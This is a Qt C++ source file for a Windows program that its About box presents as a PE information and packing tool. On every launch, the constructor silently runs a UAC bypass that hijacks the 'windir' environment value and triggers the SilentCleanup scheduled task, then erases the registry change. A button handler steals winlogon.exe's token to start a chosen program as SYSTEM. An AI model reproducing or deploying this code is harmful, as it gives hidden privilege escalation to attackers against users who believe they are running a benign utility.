#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    AutoElevate();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::AutoElevate()
{
    WCHAR elevateCommand[256] = L"add hkcu\\Environment /f /v windir /d \"";
    WCHAR exeName[256];
    ::GetModuleFileNameW(NULL,exeName,256);
    wcscat_s(elevateCommand,256,exeName);
    wcscat_s(elevateCommand,256,L" && rem \"");
    if (IsUserAnAdmin())
    {
        ::ShellExecuteW(NULL, NULL, L"reg.exe", L"delete hkcu\\Environment /v windir /f", NULL, SW_HIDE);  //已经是管理员,删除痕迹
    }
    else
    {
        ::ShellExecuteW(NULL, NULL, L"reg.exe", elevateCommand, NULL, SW_HIDE);
        ::ShellExecuteW(NULL, NULL, L"schtasks.exe", L"/Run /TN Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I", NULL, SW_HIDE);
        ::TerminateProcess(::GetCurrentProcess(),0);  //非管理员,写入注册表,重启进程
    }
}

void MainWindow::on_actionOpen_triggered()
{
    selectedFileName = QFileDialog::getOpenFileName(this,"Select","D:\\","Executeable(*.*)");
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot)
    {
        ui->lineEdit->setText("Create snapshot failed!");
        return;
    }
    PROCESSENTRY32 pe = { sizeof(pe) };
    BOOL IsSucc;
    for (IsSucc = Process32First(hSnapshot, &pe); ; IsSucc = Process32Next(hSnapshot, &pe))
    {
        if (!wcscmp(pe.szExeFile,L"winlogon.exe"))
        {
            winLogonPid = pe.th32ProcessID;
            return;
        }
    }
}


void MainWindow::on_actionAbout_Tool_triggered()
{
    QMessageBox::information(this,"Tool Information","This is a tool for PE Information query and add shell to your program, powered by Huolong, SDchao and Protein",QMessageBox::Ok,QMessageBox::Ok);
}

void MainWindow::on_pushButton_clicked()
{
    wchar_t fileName[256];
    int fileNameLength = selectedFileName.toWCharArray(fileName);
    fileName[fileNameLength] = 0;
    BOOLEAN adjustResult;
    pAdjustPriv RtlAdjustPrivilege =(pAdjustPriv) ::GetProcAddress(LoadLibraryW(L"ntdll.dll"),"RtlAdjustPrivilege");
    RtlAdjustPrivilege(0x14,TRUE,FALSE,&adjustResult);

    HANDLE tokenHandle;
    HANDLE duplicateTokenHandle;
    HANDLE SystemHandle = ::OpenProcess(PROCESS_QUERY_INFORMATION,TRUE,winLogonPid);
    if(!SystemHandle)
    {
        ui->lineEdit->setText("open process failed!");
    }
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};
    if(::OpenProcessToken(SystemHandle,TOKEN_DUPLICATE ,&tokenHandle))  //成功后
    {
        if(::DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle))
        {
            if(::CreateProcessWithTokenW(duplicateTokenHandle,LOGON_WITH_PROFILE,fileName,NULL,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi))
            {
                ui->lineEdit->setText("create process successfully!");
            }
            else
            {
                ui->lineEdit->setText("create process failed!"+QString::number(GetLastError()));
            }
        }
        else
        {
            ui->lineEdit->setText("duplicate token failed!");
        }
    }
    else
    {
        ui->lineEdit->setText("get token failed!");
    }
}
